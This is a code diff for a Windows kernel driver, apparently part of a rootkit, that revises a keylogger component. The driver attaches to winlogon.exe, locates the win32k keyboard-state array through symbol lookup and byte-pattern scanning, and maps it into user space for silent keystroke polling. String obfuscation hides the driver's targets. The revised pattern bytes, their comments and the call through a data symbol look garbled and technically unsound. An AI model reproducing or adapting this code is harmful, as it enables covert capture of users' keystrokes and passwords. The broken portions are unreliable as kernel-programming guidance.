@@ -1,7 +1,7 @@
 use core::{ffi::c_void, ptr::null_mut, slice};
 use obfstr::obfstr;
 use wdk_sys::{
-    _MEMORY_CACHING_TYPE::MmCached, _MM_PAGE_PRIORITY::NormalPagePriority, _MODE::UserMode,
+    _MEMORY_CACHING_TYPE::MmCached, _MM_PAGE_PRIORITY::NormalPagePriority, _MODE::UserMode, _MODE::KernelMode, _LOCK_OPERATION::IoReadAccess,
     ntddk::*, *,
 };
 
@@ -125,17 +125,18 @@ impl Keylogger {
     /// * `Ok(*mut c_void)` - If successful, returns a pointer to the mapped user-mode address of `gafAsyncKeyState`.
     /// * `Err(ShadowError)` - If any error occurs while finding the address or mapping memory.
     pub unsafe fn get_user_address_keylogger() -> Result<*mut c_void> {
-        // Get the PID of winlogon.exe
+        // 1. Get the PID of winlogon.exe
         let pid = get_process_by_name(obfstr!("winlogon.exe"))?;
-        // Attach to the winlogon.exe process
+        
+        // 2. Attach to the winlogon.exe process (ensuring we are in the proper session)
         let winlogon_process = Process::new(pid)?;
         let _attach_guard = ProcessAttach::new(winlogon_process.e_process);
-    
-        // Retrieve the address of gSessionGlobalSlots (instead of gafAsyncKeyState)
+        
+        // 3. Retrieve the session globals address (which points to gSessionGlobalSlots or gafAsyncKeyState)
         let session_globals_address = Self::get_session_globals_address()?;
-        log::info!("get_user_address_keylogger: Retrieved gSessionGlobalSlots at {:p}", session_globals_address);
-    
-        // Allocate an MDL for the region (adjust size as needed)
+        log::info!("get_user_address_keylogger: Retrieved session globals at {:p}", session_globals_address);
+        
+        // 4. Allocate an MDL for the region (adjust the size as needed – here we use 64 bytes as an example)
         let mdl = IoAllocateMdl(
             session_globals_address.cast(),
             core::mem::size_of::<[u8; 64]>() as u32,
@@ -146,16 +147,17 @@ impl Keylogger {
         if mdl.is_null() {
             return Err(ShadowError::FunctionExecutionFailed("IoAllocateMdl", line!()));
         }
-    
-        // Prepare the MDL for nonpaged pool mapping
-        MmBuildMdlForNonPagedPool(mdl);
-    
-        // Map the locked pages into user-mode address space
+        
+        // 5. Lock the pages via MmProbeAndLockPages (instead of MmBuildMdlForNonPagedPool)
+        //    This call will lock the pages in memory so they can be mapped safely.
+        MmProbeAndLockPages(mdl, KernelMode as i8, IoReadAccess);
+        
+        // 6. Map the locked pages into user-mode address space using MmMapLockedPagesSpecifyCache.
         let address = MmMapLockedPagesSpecifyCache(
             mdl,
             UserMode as i8,
             MmCached,
-            core::ptr::null_mut(),
+            null_mut(),
             0,
             NormalPagePriority as u32,
         );
@@ -163,57 +165,89 @@ impl Keylogger {
             IoFreeMdl(mdl);
             return Err(ShadowError::FunctionExecutionFailed("MmMapLockedPagesSpecifyCache", line!()));
         }
-    
+        
+        // The returned address can now be polled in user-mode for keystroke data without crossing back into the kernel.
         Ok(address)
     }
-
-    /// Retrieves the address of the `gafAsyncKeyState` array.
-    ///
-    /// # Returns
-    ///
-    /// * `Ok(*mut u8)` - Returns a pointer to the `gafAsyncKeyState` array if found.
-    /// * `Err(ShadowError)` - If the array is not found or an error occurs during the search.
+    
+    /// Retrieves the address of the session globals (gSessionGlobalSlots on Windows 11 or gafAsyncKeyState on Windows 10).
+    /// This function locates the target by scanning for the "mov rax, [rip+imm32]" opcode in the exported W32GetSessionState function.
     pub unsafe fn get_session_globals_address() -> Result<*mut u8> {
-        // Get the base address of win32kbase.sys.
-        let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
-        
-        // Retrieve the address of the exported function "W32GetSessionState".
-        let function_address = get_function_address(obfstr!("W32GetSessionState"), module_address)?;
-        
-        log::info!(
-            "get_session_globals_address: W32GetSessionState found at {:p}",
-            function_address
-        );
-        
-        // Define the pattern to search for: the 3-byte opcode for "mov rax, [rip+imm32]"
-        let pattern: [u8; 3] = [0x48, 0x8B, 0x05];
-        let scan_size = 0x100; // Scan the first 0x100 bytes of the function.
-        let function_bytes = core::slice::from_raw_parts(function_address as *const u8, scan_size);
-        
-        if let Some(pos) = function_bytes.windows(pattern.len()).position(|window| window == pattern) {
-            // The instruction is 7 bytes long: 3 bytes opcode + 4 bytes immediate.
-            let imm_offset = pos + pattern.len();
-            if imm_offset + 4 > scan_size {
-                return Err(ShadowError::PatternNotFound);
-            }
-            let imm_bytes: [u8; 4] = function_bytes[imm_offset..imm_offset + 4]
-                .try_into()
-                .map_err(|_| ShadowError::PatternNotFound)?;
-            let displacement = i32::from_le_bytes(imm_bytes) as isize;
+        // Define the pattern and mask for the gSessionGlobalSlots thunk.
+        // We choose a sequence covering:
+        //   0: B0 7E           ; mov al,7Eh
+        //   2: 2D A6 0E D2 FF  ; sub eax, 0FFD20EA6h
+        //   7: FF 90           ; call qword ptr [rax+imm32] (first two bytes of the opcode)
+        //   9: 7E 2D A6 0E     ; the 4-byte displacement which is dynamic -> mark as wildcards
+        //  13: D2 FF           ; sar bh, cl
+        const GSESSION_GLOBAL_SLOTS_PATTERN: [u8; 15] = [
+            0xB0, 0x7E,             // mov al, 7Eh
+            0x2D, 0xA6, 0x0E, 0xD2, 0xFF, // sub eax, 0FFD20EA6h
+            0xFF, 0x90,             // call qword ptr [rax+imm32] (call opcode)
+            0x7E, 0x2D, 0xA6, 0x0E,  // relative displacement (wildcard)
+            0xD2, 0xFF              // sar bh, cl
+        ];
+        // The mask: fixed bytes for all except the 4 bytes of the displacement.
+        // "x" = match exactly, "?" = wildcard.
+        const GSESSION_GLOBAL_SLOTS_MASK: &str = "xxxxxxxxx????xx";
+    
+        // 1. Get the base address of the module.
+        //    Here we're using "win32k.sys" but adjust this if necessary.
+        let module_address = get_module_base_address(obfstr!("win32k.sys"))?;
+    
+        // 2. Try to resolve the symbol "gSessionGlobalSlots" via your symbol lookup.
+        let mut slots_symbol_addr = get_function_address(obfstr!("gSessionGlobalSlots"), module_address)
+            .unwrap_or(core::ptr::null_mut());
+    
+        // 3. If the lookup failed, fall back to a pattern scan in a reasonable memory region.
+        if slots_symbol_addr.is_null() {
+            // For example, scan the first 0x10000 bytes of the module.
+            slots_symbol_addr = scan_for_pattern_masked(
+                module_address,
+                &GSESSION_GLOBAL_SLOTS_PATTERN,
+                GSESSION_GLOBAL_SLOTS_MASK,
+                0, // no additional offset
+                0, // no final adjustment
+                0x10000, // scan size (adjust as needed)
+            )? as *mut c_void;
             
-            // The RIP for this instruction is the address immediately after the 7-byte instruction.
-            let rip = (function_address as usize).wrapping_add(pos).wrapping_add(7);
-            let target_address = (rip as isize).wrapping_add(displacement) as *mut u8;
-            
-            log::info!(
-                "get_session_globals_address: Found gSessionGlobalSlots at {:p}",
-                target_address
-            );
-            Ok(target_address)
-        } else {
-            Err(ShadowError::PatternNotFound)
         }
+        if slots_symbol_addr.is_null() {
+            return Err(ShadowError::PatternNotFound);
+        }
+    
+        // 4. Since gSessionGlobalSlots is a thunk (code) that returns a pointer to the array,
+        //    cast its address to a function pointer type and call it.
+        type GSessionGlobalSlotsFn = unsafe extern "system" fn() -> *mut *mut u8;
+        let get_slots: GSessionGlobalSlotsFn = core::mem::transmute(slots_symbol_addr);
+        let slots_array_ptr = get_slots();
+    
+        // 5. Retrieve the current session ID.
+        //    First try to resolve W32GetCurrentWin32kSessionId via your symbol lookup.
+        let wk_module = get_module_base_address(obfstr!("win32kbase.sys"))?;
+        let mut session_id_addr = get_function_address(obfstr!("W32GetCurrentWin32kSessionId"), wk_module)
+            .unwrap_or(core::ptr::null_mut());
+        // Fallback: if not found, attempt to use MmGetSystemRoutineAddress.
+        if session_id_addr.is_null() {
+            let mut session_fn_unicode = uni::str_to_unicode(obfstr!("W32GetCurrentWin32kSessionId")).to_unicode();
+            session_id_addr = MmGetSystemRoutineAddress(&mut session_fn_unicode);
+        }
+        if session_id_addr.is_null() {
+            return Err(ShadowError::PatternNotFound);
+        }
+        type W32GetCurrentWin32kSessionIdFn = unsafe extern "system" fn() -> u32;
+        let get_session_id: W32GetCurrentWin32kSessionIdFn = core::mem::transmute(session_id_addr);
+        let session_id = get_session_id();
+        log::info!("get_session_globals_address: Current session ID: {}", session_id);
+    
+        // 6. Index into the global array (returned by the thunk) to get the key state array for the current session.
+        let target_address = *slots_array_ptr.add(session_id as usize);
+        log::info!("get_session_globals_address: Found session globals at {:p}", target_address);
+    
+        Ok(target_address)
     }
+    
+    
     
     
 }
